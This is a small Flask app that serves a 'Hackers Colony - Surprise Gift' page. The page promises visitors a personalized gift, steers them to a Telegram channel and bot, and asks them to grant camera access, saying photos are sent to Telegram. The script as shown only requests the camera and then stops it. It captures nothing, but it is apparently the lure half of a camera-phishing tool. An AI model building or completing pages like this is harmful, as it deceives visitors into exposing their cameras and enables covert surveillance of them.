from flask import Flask, render_template_string
import os

app = Flask(__name__)

@app.route('/')
def home():
    html_content = '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>🎁 Hackers Colony - Surprise Gift</title>
        <style>
            body { margin:0; background:#0b0014; color:white; font-family:Arial; text-align:center; padding:20px; }
            .container { max-width:400px; margin:50px auto; padding:30px; background:#1a0030; border-radius:20px; border:2px solid #ff00ff; }
            h1 { color:#ff00ff; font-size:28px; }
            button { background:#ff00ff; color:black; border:none; padding:15px 30px; font-size:18px; border-radius:10px; cursor:pointer; margin:20px 0; }
            a { color:#00ffff; }
            .step { background:rgba(255,255,255,0.1); padding:10px; border-radius:10px; margin:10px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎁 Surprise Gift ✨</h1>
            <p>Get your personalized gift from Hackers Colony!</p>
            
            <div class="step">
                <strong>Step 1:</strong> Join <a href="https://t.me/HackersColony">@HackersColony</a>
            </div>
            <div class="step">
                <strong>Step 2:</strong> Get link from <a href="https://t.me/HackersColonyBot">@HackersColonyBot</a>
            </div>
            
            <button onclick="startCamera()">🎯 Start Camera Access</button>
            
            <p style="font-size:12px; color:#888; margin-top:20px;">
                Camera access required | Photos sent to Telegram
            </p>
        </div>
        
        <script>
            function startCamera() {
                if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                    navigator.mediaDevices.getUserMedia({ video: true })
                    .then(function(stream) {
                        stream.getTracks().forEach(track => track.stop());
                        alert('✅ Camera access granted!\\nYour gift is being created...\\nCheck Telegram for photos.');
                    })
                    .catch(function(error) {
                        alert('❌ Camera access denied.\\nPlease allow camera access.');
                    });
                } else {
                    alert('❌ Camera not available on this device.');
                }
            }
        </script>
    </body>
    </html>
    '''
    return render_template_string(html_content)

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    app.run(host='0.0.0.0', port=port)
